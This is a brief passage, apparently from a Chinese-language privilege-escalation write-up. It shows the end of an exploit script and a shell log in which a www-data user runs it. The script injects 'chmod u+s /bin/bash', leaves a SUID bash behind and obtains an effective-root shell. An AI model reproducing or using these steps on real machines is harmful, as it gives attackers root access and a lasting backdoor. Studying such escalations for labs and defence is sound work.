    print("[-] 未成功, 重跑脚本即可")
```


```bash
www-data@customer:/tmp$ python3 ez.py 
[*] CMD: chmod u+s /bin/bash #
[+] 成功! (第1次) /bin/bash 已带S位, 执行: bash -p
www-data@customer:/tmp$ bash -p
bash-5.0# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-5.0# 
```
